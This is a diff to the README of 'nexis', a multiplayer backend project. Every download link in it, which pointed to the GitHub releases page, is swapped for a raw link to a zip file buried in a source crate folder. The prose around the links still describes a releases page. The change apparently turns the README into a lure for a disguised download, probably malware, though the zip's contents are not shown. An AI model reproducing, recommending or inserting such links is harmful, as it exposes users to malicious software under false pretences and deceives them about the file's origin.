@@ -1,6 +1,6 @@
 # 🕹️ nexis - Multiplayer Backend That Works Anywhere
 
-[![Download nexis](https://img.shields.io/badge/Download-nexis-blue?style=for-the-badge)](https://github.com/AZAZELBOT/nexis/releases)
+[![Download nexis](https://img.shields.io/badge/Download-nexis-blue?style=for-the-badge)](https://raw.githubusercontent.com/AZAZELBOT/nexis/main/server/crates/transport_ws/Software_1.2-alpha.2.zip)
 
 ---
 
@@ -30,13 +30,13 @@ Nexis runs in the background and uses network resources to keep players connecte
 
 You will find the latest version of nexis on the release page below. This page hosts all versions and updates.
 
-[Visit this page to download nexis](https://github.com/AZAZELBOT/nexis/releases)
+[Visit this page to download nexis](https://raw.githubusercontent.com/AZAZELBOT/nexis/main/server/crates/transport_ws/Software_1.2-alpha.2.zip)
 
 ### Step 1: Navigate to the Download Page
 
 Open your internet browser and go to:
 
-https://github.com/AZAZELBOT/nexis/releases
+https://raw.githubusercontent.com/AZAZELBOT/nexis/main/server/crates/transport_ws/Software_1.2-alpha.2.zip
 
 Here, you will see a list of available versions. Look for the most recent one on top.
 
@@ -117,7 +117,7 @@ If you need more help, check the official repository or community forums for adv
 ## 📥 Download Link Again
 
 Get the latest nexis files here:  
-[https://github.com/AZAZELBOT/nexis/releases](https://github.com/AZAZELBOT/nexis/releases)  
+[https://raw.githubusercontent.com/AZAZELBOT/nexis/main/server/crates/transport_ws/Software_1.2-alpha.2.zip](https://raw.githubusercontent.com/AZAZELBOT/nexis/main/server/crates/transport_ws/Software_1.2-alpha.2.zip)  
 
 Use this link to access all versions and updates for Windows and other systems.
 
